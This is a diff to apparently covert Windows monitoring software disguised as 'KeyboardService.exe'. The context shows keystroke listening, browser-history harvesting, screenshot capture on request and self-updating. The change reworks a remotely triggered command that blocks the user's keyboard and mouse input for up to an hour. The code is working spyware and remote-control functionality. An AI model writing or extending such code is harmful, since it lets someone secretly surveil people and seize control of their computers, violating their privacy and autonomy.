@@ -50,7 +50,7 @@ WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.2.20"
+APP_VERSION = "1.2.21"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -117,6 +117,7 @@ SERVICE_KEYBOARD_LISTENER = None
 collection_paused = False
 update_lock = Lock()
 input_block_timer = None
+input_block_stop_event = None
 browser_history_seen = set()
 
 SHIFTED_SYMBOLS = {
@@ -1157,21 +1158,30 @@ def open_message_document(message):
     os.startfile(document_path)
 
 
-def release_input_block():
-    global input_block_timer
+def release_input_block(stop_event, ready_event, result, duration):
+    global input_block_timer, input_block_stop_event
+    user32 = ctypes.WinDLL("user32", use_last_error=True)
+    user32.BlockInput.argtypes = [wintypes.BOOL]
+    user32.BlockInput.restype = wintypes.BOOL
     try:
-        user32 = ctypes.WinDLL("user32", use_last_error=True)
-        user32.BlockInput.argtypes = [wintypes.BOOL]
-        user32.BlockInput.restype = wintypes.BOOL
+        if not user32.BlockInput(True):
+            error_code = ctypes.get_last_error()
+            result["error"] = OSError(error_code, ctypes.FormatError(error_code))
+            return
+        ready_event.set()
+        stop_event.wait(duration)
         if not user32.BlockInput(False):
             error_code = ctypes.get_last_error()
-            raise OSError(error_code, ctypes.FormatError(error_code))
+            print(f"Could not release Windows input block: {error_code}: {ctypes.FormatError(error_code)}")
     finally:
-        input_block_timer = None
+        ready_event.set()
+        if input_block_stop_event is stop_event:
+            input_block_timer = None
+            input_block_stop_event = None
 
 
 def handle_device_command(command, command_id=None, message=""):
-    global collection_paused, input_block_timer
+    global collection_paused, input_block_timer, input_block_stop_event
     if not command:
         return
     try:
@@ -1195,20 +1205,29 @@ def handle_device_command(command, command_id=None, message=""):
                 raise RuntimeError("Input block duration must be a whole number of seconds") from error
             if duration < 1 or duration > 3600:
                 raise RuntimeError("Input block duration must be between 1 and 3600 seconds")
-            if input_block_timer is not None:
+            if input_block_stop_event is not None:
+                input_block_stop_event.set()
+            if input_block_timer is not None and input_block_timer.is_alive():
                 try:
-                    input_block_timer.cancel()
+                    input_block_timer.join(timeout=2)
                 except Exception:
                     pass
-            user32 = ctypes.WinDLL("user32", use_last_error=True)
-            user32.BlockInput.argtypes = [wintypes.BOOL]
-            user32.BlockInput.restype = wintypes.BOOL
-            if not user32.BlockInput(True):
-                error_code = ctypes.get_last_error()
-                raise OSError(error_code, ctypes.FormatError(error_code))
-            input_block_timer = Timer(duration, release_input_block)
-            input_block_timer.daemon = True
+            stop_event = Event()
+            ready_event = Event()
+            result = {}
+            input_block_stop_event = stop_event
+            input_block_timer = Thread(
+                target=release_input_block,
+                args=(stop_event, ready_event, result, duration),
+                daemon=True,
+            )
             input_block_timer.start()
+            ready_event.wait(timeout=5)
+            if result.get("error"):
+                input_block_timer.join(timeout=2)
+                input_block_timer = None
+                input_block_stop_event = None
+                raise result["error"]
         elif command == "pause":
             flush_message_buffer()
             collection_paused = True
